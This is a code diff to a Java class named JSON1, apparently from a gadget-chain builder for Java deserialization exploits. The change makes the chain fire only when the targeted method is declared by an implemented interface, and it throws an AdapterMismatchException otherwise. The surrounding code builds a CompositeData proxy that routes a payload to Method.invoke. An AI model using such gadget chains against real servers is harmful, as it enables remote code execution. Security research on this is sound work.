@@ -23,6 +23,7 @@ import javax.management.openmbean.TabularDataSupport;
 import javax.management.openmbean.TabularType;
 
 
+import org.ses.gadgetbuilder.exceptions.AdapterMismatchException;
 import org.ses.gadgetbuilder.util.Reflections;
 import org.springframework.aop.framework.AdvisedSupport;
 import net.sf.json.JSONObject;
@@ -75,15 +76,24 @@ public class JSON1 extends MethodInvokeGadgetChain<EqualsTrampoline, GetterMetho
         System.out.println(Arrays.toString(payload.getClass().getInterfaces()));
 
         // Will call all getter methods on payload that are defined in the given interfaces
+        // If the Method.invoke target is not declared by any of these interfaces, throw an AdapterMismatchException
+        boolean containsInvocationTarget = false;
+
         ArrayList<Class> ifaces = new ArrayList<Class>();
         ifaces.add(CompositeData.class);
         for (Class clazz : payload.getClass().getInterfaces()) {
             for (Method method : clazz.getDeclaredMethods()) {
-                if (method.getName().startsWith("get")) {
+                if (method.getName().equals(methodInvokeAdapter.getMethodName())) {
                     ifaces.add(clazz);
+                    containsInvocationTarget = true;
                     break;
                 }
             }
+        }
+
+        if (!containsInvocationTarget) {
+            throw new AdapterMismatchException("JSON1 gadget chain can only reach Method.invoke getter targets declared by implemented interfaces. " +
+                    "This is not the case for " + methodInvokeAdapter.getClass().getName());
         }
 
         final CompositeData cdsProxy = (CompositeData) Proxy.newProxyInstance(JSON1.class.getClassLoader(), ifaces.toArray(new Class[0]), invocationHandler);
